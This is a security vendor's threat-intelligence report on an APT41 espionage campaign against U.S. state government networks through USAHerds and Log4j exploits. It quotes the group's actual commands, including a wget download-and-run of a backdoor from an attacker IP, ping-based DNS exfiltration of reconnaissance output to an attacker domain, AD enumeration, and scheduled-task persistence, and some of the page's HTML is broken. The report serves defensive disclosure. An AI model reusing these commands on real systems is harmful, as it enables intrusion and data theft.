<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><em>UPDATE (Mar. 8): The original post may not have provided full clarity that CVE-2021-44207 (USAHerds) had a patch developed by Acclaim Systems for applicable deployments on or around Nov. 15, 2021. Mandiant cannot speak to the affected builds, deployment, adoption, or other technical factors of this vulnerability patch beyond its availability.</em></p>
<p>In May 2021 Mandiant responded to an APT41 intrusion targeting a United States state government computer network. This was just the beginning of Mandiant’s insight into a persistent months-long campaign conducted by APT41 using vulnerable Internet facing web applications as their initial foothold into networks of interest. APT41 is a prolific Chinese state-sponsored espionage group known to target organizations in both the public and private sectors and also conducts <a href="https://cloud.google.com/blog/topics/threat-intelligence/apt41-dual-espionage-and-cyber-crime-operation" rel="noopener" target="_blank">financially motivated activity for personal gain</a>.</p>
<p>In this blog post, we detail APT41’s persistent effort that allowed them to successfully compromise at least six U.S. state government networks by exploiting vulnerable Internet facing web applications, including using a zero-day vulnerability in the USAHerds application (CVE-2021-44207) as well as the now infamous zero-day in Log4j (CVE-2021-44228). While the overall goals of APT41's campaign remain unknown, our investigations into each of these intrusions has revealed a variety of new techniques, malware variants, evasion methods, and capabilities.</p>
<h2>Campaign Overview</h2>
<p>Although APT41 has <a href="https://cloud.google.com/blog/topics/threat-intelligence/apt41-initiates-global-intrusion-campaign-using-multiple-exploits" rel="noopener" target="_blank">historically performed mass scanning and exploitation of vulnerabilities</a>, our investigations into APT41 activity between May 2021 and February 2022 uncovered evidence of a deliberate campaign targeting U.S. state governments. During this timeframe, APT41 successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications, often written in ASP.NET. In most of the web application compromises, APT41 conducted .NET deserialization attacks; however, we have also observed APT41 exploiting SQL injection and directory traversal vulnerabilities.</p>
<p>In the instance where APT41 gained access through a SQL injection vulnerability in a proprietary web application, Mandiant Managed Defense quickly detected and contained the activity; however, two weeks later APT41 re-compromised the network by exploiting a previously unknown zero-day vulnerability in a commercial-off-the-shelf (CoTS) application, USAHerds. In two other instances, Mandiant began an investigation at one state agency only to find that APT41 had also compromised a separate, unrelated agency in the same state.</p>
<p>APT41 was also quick to adapt and use publicly disclosed vulnerabilities to gain initial access into target networks, while also maintaining existing operations. On December 10th, 2021, the Apache Foundation released an <a href="https://logging.apache.org/log4j/2.x/security.html" rel="noopener" target="_blank">advisory</a> for a critical remote code execution (RCE) vulnerability in the commonly used logging framework Log4J. Within hours of the advisory, APT41 began exploiting the vulnerability to later compromise at least two U.S. state governments as well as their more traditional targets in the insurance and telecommunications industries.</p>
<p>In late February 2022, APT41 re-compromised two previous U.S. state government victims. Our ongoing investigations show the activity closely aligns with APT41's May-December 2021 activity, representing a continuation of their campaign into 2022 and demonstrating their unceasing desire to access state government networks. A timeline of representative intrusions from this campaign can be seen in Figure 1.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 1: U.S. state government campaign timeline</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>The goals of this campaign are currently unknown, though Mandiant has observed evidence of APT41 exfiltrating Personal Identifiable Information (PII). Although the victimology and targeting of PII data is consistent with an espionage operation, Mandiant cannot make a definitive assessment at this time given APT41’s history of moonlighting for personal financial gain.</p>
<h2>Exploitation of Deserialization Vulnerabilities</h2>
<p>APT41 has primarily used malicious <a href="https://docs.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)" rel="noopener" target="_blank">ViewStates</a> to trigger code execution against targeted web applications. Within the ASP.NET framework, ViewState is a method for storing the application’s page and control values in HTTP requests to and from the server. The ViewState is sent to the server with each HTTP request as a Base64 encoded string in a hidden form field. The web server decodes the string and applies additional transformations to the string so that it can be unpacked into data structures the server can use. This process is known as deserialization.</p>
<p>Insecure deserialization of user-supplied input can result in code execution. ASP.NET has several <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide" rel="noopener" target="_blank">insecure deserialization providers</a>, including the one used for ViewStates: <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter" rel="noopener" target="_blank">ObjectStateFormatter</a>. To prevent a threat actor from manipulating the ViewState and taking advantage of the insecure deserialization provider, the ViewState is protected by a Message Authentication Code (MAC). This MAC is a cryptographically signed hash value that the server uses to ensure that the ViewState has not been tampered with, possibly to trigger code execution. The integrity of the ViewState depends on the application’s machineKey remaining confidential. The machineKey is stored on the application server in a configuration file named web.config.</p>
<p> </p>
<pre><code>&lt;machineKey validationKey=&quot;XXXXXXXXXXXXXXXXX&quot; decryptionKey=&quot;XXXXXXXXXXXXXXXXXXXXXX&quot; validation=&quot;SHA1&quot; /&gt;</code></pre>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 2 Sample machineKey attribute from a web.config file</div>
<p>A threat actor with knowledge of the machineKey can construct a malicious ViewState and then generate a new and valid MAC that the server accepts. With a valid MAC, the server will then deserialize the malicious ViewState, resulting in the execution of code on the server. Publicly available tools such as <a href="https://github.com/pwntester/ysoserial.net" rel="noopener" target="_blank">YSoSerial.NET</a> exist to construct these malicious ViewStates. This is precisely how APT41 initiated their campaign in May 2021.</p>
<h3>Proprietary Web Application Targeting</h3>
<p>In June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal vulnerability specifically to read the web.config file for a vulnerable web application on a victim web server. APT41 then used the machineKey values from the web.config file to generate a malicious ViewState payload for a deserialization exploit. Mandiant did not identify how APT41 originally obtained the machineKey values for the proprietary application exploited in May 2021 or the USAHerds application, which was first exploited in July 2021. However, it is likely that APT41 obtained the web.config file through similar means.</p>
<p>To craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET. In order to successfully load arbitrary .NET assemblies into memory, APT41 set the DisableActivitySurrogateSelectorTypeCheck property flag to true within the ConfigurationManager.AppSettings class of the running application via the ViewState payload. APT41 subsequently loaded .NET assemblies into memory using additional YSoSerial payloads configured to write webshells to a hardcoded filepath on disk.</p></span></section><section keyboard language.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-4-img.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-4-img.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-4-img.max-800x800.png" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 4: Deserialized JScript Webshell</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>For additional information regarding deserialization exploits and our new hunting rule generation tool ‘<a href="https://github.com/mandiant/heyserial" rel="noopener" target="_blank">HeySerial</a>’, read our blog post, <a href="https://cloud.google.com/blog/topics/threat-intelligence/hunting-deserialization-exploits" rel="noopener" target="_blank">Now You Serial, Now You Don’t — Systematically Hunting for Deserialization Exploits</a>.</p>
<h3>USAHerds (CVE-2021-44207) Zero-Day</h3>
<p>In three investigations from 2021, APT41 exploited a zero-day vulnerability in the <a href="https://www.tnatc.org/assets/downloads/USAHerds-2019-05-01.pdf" rel="noopener" target="_blank">USAHerds</a> web application. USAHerds is a CoTS application written in ASP.NET and used by 18 states for animal health management. The vulnerability in USAHerds (CVE-2021-44207) is similar to a previously reported vulnerability in Microsoft Exchange Server (<a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys" rel="noopener" target="_blank">CVE-2020-0688</a>), where the applications used a static validationKey and decryptionKey (collectively known as the machineKey) by default. As a result, all installations of USAHerds shared these values, which is against the best practice of using uniquely generated machineKey values per application instance.</p>
<p>Generating unique machineKey values is critical to the security of an ASP.NET web application because the values are used to secure the integrity of the ViewState.</p>
<p>Mandiant did not identify how APT41 originally obtained the machineKey values for USAHerds; however, once APT41 obtained the machineKey, they were able to compromise any server on the Internet running USAHerds. As a result, there are potentially additional unknown victims.</p>
<h3>Log4j (CVE-2021-44228)</h3>
<p>The most recent APT41 campaign began shortly after the release of CVE-2021-44228 and its related proof-of-concept exploits in December 2021. Exploiting this vulnerability, also known as Log4Shell, causes Java to fetch and deserialize a remote Java object, resulting in potential code execution. Similar to their previous web application targeting, APT41 continued to use YSoSerial generated deserialization payloads to perform reconnaissance and deploy backdoors. Notably, APT41 deployed a new variant of the KEYPLUG backdoor on Linux servers at multiple victims, a malware sub-family we now track as KEYPLUG.LINUX. KEYPLUG is a modular backdoor written in C++ that supports multiple network protocols for command and control (C2) traffic including HTTP, TCP, KCP over UDP, and WSS. APT41 heavily used the Windows version of the KEYPLUG backdoor at state government victims between June 2021 and December 2021, thus the deployment of a ported version of the backdoor closely following the state government campaign was significant.</p>
<p>After exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently used at government victims months prior. An example ping command is shown in Figure 5.</p>
<p> </p>
<pre><code>ping -c 1 libxqagv[.]ns[.]dns3[.]cf   </code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 5: Ping Command to Attacker Controlled Infrastructure</span></p>
<p>Upon gaining access to a target environment, APT41 performed host and network reconnaissance before deploying KEYPLUG.LINUX to establish a foothold in the environment. Sample commands used to deploy KEYPLUG.LINUX can be seen in Figure 6.</p>
<p> </p>
<pre><code>wget http://103.224.80[.]44:8080/kernel                         
chmod 777 kernel
mv kernel .kernel
nohup ./.kernel &amp;</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 6: Deployment of KEYPLUG.LINUX Following Log4j Exploitation</div>
</div>
<h2>“All Killer No Filler” Intrusion TTPs</h2>
<p>The updated tradecraft and new malware continue to show APT41 is a highly adaptable and resourceful actor. In this section, we detail the most pertinent post-compromise techniques.</p>
<h3>Reconnaissance</h3>
<p>After gaining initial access to an internet-facing server, APT41 performed extensive reconnaissance and credential harvesting. A common tactic seen is the deployment of a <a href="https://yck1509.github.io/ConfuserEx/#:~:text=ConfuserEx%20is%20an%20free%2C%20open,Graphical%20interface" rel="noopener" target="_blank">ConfuserEx</a> obfuscated BADPOTATO binary to abuse named pipe impersonation for local NT AUTHORITY\SYSTEM privilege escalation. Once APT41 escalated to NT AUTHORITY\SYSTEM privileges, they copied the local SAM and SYSTEM registry hives to a staging directory for credential harvesting and exfiltration. APT41 has additionally used Mimikatz to execute the lsadump::sam command on the dumped registry hives to obtain locally stored credentials and NTLM hashes.</p>
<p>APT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment.</p>
<p> </p>
<pre><code>c:\programdata\dsquery.exe * -filter "(objectCategory=Person)" -attr cn title displayName description department company sAMAccountName mail mobile telephoneNumber whenCreated whenChanged logonCount badPwdCount distinguishedName -L -limit 0
c:\programdata\dsquery.exe * -filter "(objectCategory=Computer)" -attr cn operatingSystem operatingSystemServicePack operatingSystemVersion dNSHostName whenCreated whenChanged lastLogonTimestamp distinguishedName description managedBy mS-DS-CreatorSID -limit 0
c:\programdata\dsquery.exe * -filter "(objectCategory=Computer)" -attr cn servicePrincipalName -L -limit 0
c:\programdata\dsquery.exe * -filter "(objectCategory=Group)" -uc -attr cn sAMAccountName distinguishedName description -limit 0
c:\programdata\dsquery.exe * -filter "(objectClass=organizationalUnit)" -attr ou name whenCreated distinguishedName gPLink -limit 0</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 7: dsquery Active Directory Reconnaissance Commands</div>
</div>
<p>During the early stage of one U.S. state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN. DUSTPAN is an in-memory dropper written in C++ that leverages ChaCha20 to decrypt embedded payloads. Different variations of DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary. DUSTPAN is consistent with the publicly named <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/earth-baku-returns" rel="noopener" target="_blank">StealthVector</a>, reported by Trend Micro in August 2021. During the intrusion, DUSTPAN was used to drop a Cobalt Strike BEACON backdoor.</p>
<h3>Anti-Analysis</h3>
<p>APT41 continues to leverage advanced malware in their existing toolkit, such as the <a href="https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id" rel="noopener" target="_blank">DEADEYE launcher and LOWKEY</a> backdoor, with added capabilities and anti-analysis techniques to hinder investigations. During a recent intrusion Mandiant identified a new malware variant, DEADEYE.EMBED, contained in an Alternate Data Stream of a local file. DEADEYE.EMBED variants embed the payload inside of the compiled binary rather than appended to the overlay at the end of the file, as seen in DEADEYE.APPEND.</p>
<p>APT41 commonly packages their malware with VMProtect to slow reverse engineering efforts. During multiple U.S. state government intrusions, APT41 incorporated another anti-analysis technique by chunking a VMProtect packaged DEADEYE binary into multiple sections on disk. Breaking the binary into multiple files reduces the chance that all samples can be successfully acquired during a forensic investigation. Common file naming conventions used by APT41 when deploying DEADEYE on victim hosts can be seen in Figure 8.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 8: DEADEYE Filenames</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>These files would then be combined into a single DLL before execution as seen in Figure 9.</p>
<p> </p>
<pre><code>"cmd" /c copy /y /b C:\Users\public\syslog_6-*.dat C:\Users\public\syslog.dll</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 9: DEADEYE Command to concatenate DEADEYE sections</div>
</div>
<p>In addition to separating their VMProtect packaged malware on disk, APT41 changed the standard VMProtect section names (.vmp) to UPX section names (.upx). By doing so, the malware could evade basic hunting detections that flag binaries packaged with VMProtect. During Log4j exploitation, APT41 similarly chunked a KEYPLUG.LINUX binary into four separate files named “xaa”, ” xab”, ” xac”, and ”xad”. APT41 also packaged the KEYPLUG.LINUX binary with VMProtect and used UPX section names. This technique is very low in prevalence across our malware repository, and even lower in prevalence when searching across ELF files.</p>
<p>APT41 also updated the DEADEYE execution guardrail capabilities used during the campaign. <a href="https://attack.mitre.org/techniques/T1480/" rel="noopener" target="_blank">Guardrailing</a> is a technique used by malware to ensure that the binary only executes on systems that the threat actor intended. DEADEYE samples from older campaigns used the victim computer’s <a href="https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id" rel="noopener" target="_blank">volume serial number</a> but they have since been updated to use the hostname and/or DNS domain during the U.S. state government campaign. To acquire the local computer’s hostname and DNS domain, DEADEYE executes the WinAPI functions GetComputerNameA and/or GetComputerNameExA and provides it as input for a generated decryption key.</p>
<h3>Persistence</h3>
<p>APT41 continues to leverage advanced tradecraft to remain persistent and undetected. In multiple instances, the Windows version of the KEYPLUG backdoor leveraged <a href="https://attack.mitre.org/techniques/T1102/001/" rel="noopener" target="_blank">dead drop resolvers</a> on two separate tech community forums. The malware fetches its true C2 address from encoded data on a specific forum post. Notably, APT41 continues to update the community forum posts frequently with new dead drop resolvers during the campaign. APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure hidden.</p>
<p>To persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.</p>
<p> </p>
<pre><code>SCHTASKS  /Change  /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 10: Modified Scheduled Task</div>
</div>
<p>APT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S. state government intrusions:</p>
<ul>
<li><code>\Microsoft\Windows\PLA\Server Manager Performance Monitor</code></li>
<li><code>\Microsoft\Windows\Ras\ManagerMobility</code></li>
<li><code>\Microsoft\Windows\WDI\SrvSetupResults</code></li>
<li><code>\Microsoft\Windows\WDI\USOShared</code></li>
</ul>
<p>Another technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 11: Modified IAT (CFF Explorer)</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>APT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE. During one intrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory. The identified LOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints:</p>
<ul>
<li><code>http://&lt;HOST:PORT&gt;/USAHerds/Common/%s.css </code></li>
<li><code>https://&lt;HOST:PORT&gt;/USAHerds/Common/%s.css</code></li>
</ul>
<p>APT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server.</p>
<h3>“It’s Always Cloudy in Chengdu” — Cloudflare Usage</h3>
<p>APT41 has substantially increased their usage of Cloudflare services for C2 communications and data exfiltration. Specifically, APT41 leveraged <a href="https://workers.cloudflare.com/" rel="noopener" target="_blank">Cloudflare Workers</a> to deploy serverless code accessible through the Cloudflare CDN which helps proxy C2 traffic to APT41 operated infrastructure.</p>
<p>At multiple victims, APT41 issued ping commands where the output of a reconnaissance command was prepended to subdomains of Cloudflare proxied infrastructure. Once the ping command was executed, the local DNS resolver attempted to resolve the fabricated domain containing the prepended command output. The forward DNS lookup eventually reached the primary domain's Cloudflare name servers, which were unable to resolve an IP address for the fabricated domain. However, the DNS activity logs of the attacker-controlled domain recorded the DNS lookup of the subdomain, allowing the group to collect the reconnaissance command output.</p>
<p>Examples of this technique can be seen in Figure 12 to Figure 15.</p>
<p> </p>
<pre><code>$a=whoami;ping ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($a)).replace('-','')+""[.]ns[.]time12[.]cf"")
</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 12: Reconnaissance Exfiltration</div>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"> </div>
</div>
<pre><code>cmd.exe /c ping %userdomain%[.]ns[.]time12[.]cf
</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 13: Reconnaissance Exfiltration</div>
</div>
<p>In Figure 14, APT41 issued a command to find the volume serial number of the system, which has historically been used as the decryption key for DEADEYE payloads.</p>
<p> </p>
<pre><code>ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+'.ns[.]time12[.]cf</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 14: Volume Serial Number Exfiltration</div>
</div>
<p>In this last example, the command prints the length of the file syslog_6-1.dat, likely to ensure it has been fully written to disk prior to combining the multiple files into the full malicious executable.</p>
<p> </p>
<pre><code>ping -n 1 ((ls C:\Users\public\syslog_6-1.dat).Length.ToString()+"".ns[.]time12[.]cf"")
</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 15: File Size Exfiltration</div>
</div>
<p>APT41 leveraged the aforementioned technique for further data exfiltration by hex encoding PII data and prepending the results as subdomains of the attacker-controlled domain. The resulting DNS lookups triggered by the ping commands would be recorded in the activity logs and available to APT41.</p>
<p>APT41’s continued usage of Cloudflare services is further exemplified in recently developed KEYPLUG samples. Mandiant identified a unique capability added to KEYPLUG that leverages the WebSocket over TLS (WSS) protocol for C2 communication. According to Cloudflare, WebSocket traffic can be established through the Cloudflare CDN edge servers, which will proxy data through to the specified origin server.</p>
<p>KEYPLUG includes a hardcoded one-byte XOR encoded configuration file that lists the specific communication protocol, servers, and additional settings. After KEYPLUG decodes the hardcoded configuration file at runtime, it will parse the configuration to determine the appropriate network protocol and servers to use for command and control. After the configuration is parsed, KEYPLUG randomly chooses a CIDR block from the list then randomly chooses an IP address within the CIDR block based on the current tick count of the infected computer.</p>
<p>Figure 16 details an example configuration file identified during a recent U.S. state government intrusion.</p>
<p> </p>
<pre><code>WSS://104.24.0.0/14;103.22.200.0/22;103.21.244.0/22:443|7600|5|1|afdentry.workstation.eu.org:443</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 16: KEYPLUG Configuration</div>
</div>
<p>The CIDR blocks listed in Figure 16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious domain <strong>afdentry[.]workstation[.]eu[.]org.</strong></p>
<p>Figure 17 is an example HTTP request sent by KEYPLUG to initiate and upgrade to the WSS protocol using Cloudflare infrastructure.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 17: KEYPLUG HTTP Upgrade Request</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>We notified Cloudflare of this malicious activity and they took prompt action to disrupt communications to the malicious infrastructure. APT41’s increased usage of Cloudflare services indicates a desire to leverage Cloudflare’s flexibility and deter identification and blocking of their true C2 servers.</p>
<h2>Outlook</h2>
<p>APT41's recent activity against U.S. state governments consists of significant new capabilities, from new attack vectors to post-compromise tools and techniques. APT41 can quickly adapt their initial access techniques by re-compromising an environment through a different vector, or by rapidly operationalizing a fresh vulnerability. The group also demonstrates a willingness to retool and deploy capabilities through new attack vectors as opposed to holding onto them for future use. APT41 exploiting Log4J in close proximity to the USAHerds campaign showed the group’s flexibility to continue targeting U.S state governments through both cultivated and co-opted attack vectors. Through all the new, some things remain unchanged: APT41 continues to be undeterred by the U.S. Department of Justice (DOJ) <a href="https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer" rel="noopener" target="_blank">indictment</a> in September 2020.</p>
<h2>Indicators</h2>
<p> </p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">

<pre><code>rule M_APT_Backdoor_KEYPLUG_MultiXOR_Config
{
    meta:
        author = &quot;Mandiant&quot;
